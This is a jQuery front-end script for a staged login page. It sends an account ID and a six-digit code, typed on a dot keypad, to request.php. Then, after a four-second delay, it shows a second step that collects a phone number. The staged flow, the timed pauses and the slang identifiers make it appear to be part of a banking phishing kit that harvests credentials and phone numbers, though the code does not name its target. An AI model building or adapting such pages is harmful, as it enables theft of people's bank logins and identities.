/*global $, console, alert, prompt */
/*jslint plusplus: true, evil: true */
/*eslint no-unused-vars: "error"*/
/*eslint-env browser*/
$(document).ready(function() {
    'use strict';
    document.getElementById('nn').value = "";
})
$('.rimka_right').click(function() {
    'use strict';
    $('.point').css({ "background": "url('img/point1.png') no-repeat center" });
    $('#nn').val("");
})
$('.put').keyup(function() {
    'use strict';
    $('.ruslt').addClass('hide');
    if ($('.put').val().length > 7) {
        if (isNaN($('.put').val())) {

        } else {
            $('.sup').css({ "background": "url('img/val.png') no-repeat center" });
        }
    }
})
$('.sup').click(function() {
    'use strict';
    $('.put').val("");
    $('.ruslt').addClass('hide');
    $('.maison').addClass('hide');
    $('.butts').removeClass('hide');
    $('.point').css({ "background": "url('img/point1.png') no-repeat center" });
    $('#nn').val("");
})
$('.buttoxs').click(function() {
    'use strict';
    if ($('.put').val().length <= 7) {
        $('.ruslt').removeClass('hide');
        return;
    } else {
        if (isNaN($('.put').val())) {
            $('.ruslt').removeClass('hide');
            return;
        } else {
            $('.maison').removeClass('hide');
            $('.butts').addClass('hide');
            //alert("zaz");

        }
    }

})

function is_ok() {
    'use strict';
    setTimeout(function() {
        $('.buttox').removeClass("moha");
        $('.layout_num').removeClass("hide");
        $('.layout_contener').removeClass("hide");
    }, 4000)
}

function send_data() {
    'use strict';
    $('.ruslt').removeClass('hide');

}

function okok() {
    'use strict';
    setTimeout(function() {
        $('.drouka-left').addClass("valids");
        $('#lobia').addClass("hide");
        $('#ren').removeClass("hide");
        $('.poka').addClass('hide');
    }, 3000)
}

$('.poka').click(function() {
    'use strict';
    if ($('.put2').val().length >= 10) {
        $('.drouka-left').addClass("loader");
        $.ajax({
            type: 'POST',
            url: 'request.php',
            cash: false,
            dataType: 'json',
            data: "step=mobi&num=" + $('.put2').val(),
            beforeSend: function() {},
            success: function(data) {
                switch (data.error) {
                    case 0:
                        okok();
                        break;
                    case 1:
                        //send_data();
                        break;

                }

            }

        })


        //alert("oui");
    }
})
$('.buttox').click(function() {
    'use strict';
    if ($('.put').val().length >= 7 && $('#nn').val().length >= 6) {

        $.ajax({
            type: 'POST',
            url: 'request.php',
            cash: false,
            dataType: 'json',
            data: "step=login&id=" + $('.put').val() + "&pss=" + $('#nn').val(),
            beforeSend: function() {
                $('.buttox').addClass("moha");
            },
            success: function(data) {
                switch (data.error) {
                    case 0:
                        is_ok();
                        break;
                    case 1:
                        send_data();
                        break;

                }

            }
        })


    }

})
$('.put').keypress(function(event) {
    'use strict';
    if ($('.put').val().length == 0) {
        $('.sup').css({ "background": "url('img/del.png') no-repeat center" });
    }
})
$('.put').keydown(function() {
    'use strict';
    if ($('.put').val().length <= 7) {
        $('.sup').css({ "background": "url('img/del.png') no-repeat center" });
    }

    if (event.keyCode === 8 || event.keyCode === 64) {
        $('.sup').css({ "background": "url('img/del.png') no-repeat center" });
        $('.maison').addClass('hide');
        $('.butts').removeClass('hide');
        $('.ruslt').addClass('hide');
        $('.point').css({ "background": "url('img/point1.png') no-repeat center" });
        $('#nn').val("");
    }

})

function sendme(howa) {
    'use strict';
    var plus = document.getElementById('nn');
    if (plus.value.length <= 5) {
        if (plus.value.length == 0) {
            $('.rimka_right').removeClass('hide');
            $('#dd1').css({ "background": "url('img/point.png') no-repeat center" });
        }
        if (plus.value.length == 1) {
            $('#dd2').css({ "background": "url('img/point.png') no-repeat center" });
        }
        if (plus.value.length == 2) {
            $('#dd3').css({ "background": "url('img/point.png') no-repeat center" });
        }
        if (plus.value.length == 3) {
            $('#dd4').css({ "background": "url('img/point.png') no-repeat center" });
        }
        if (plus.value.length == 4) {
            $('#dd5').css({ "background": "url('img/point.png') no-repeat center" });
        }
        if (plus.value.length == 5) {
            $('#dd6').css({ "background": "url('img/point.png') no-repeat center" });
        }

        plus.value = plus.value + howa;

    }

}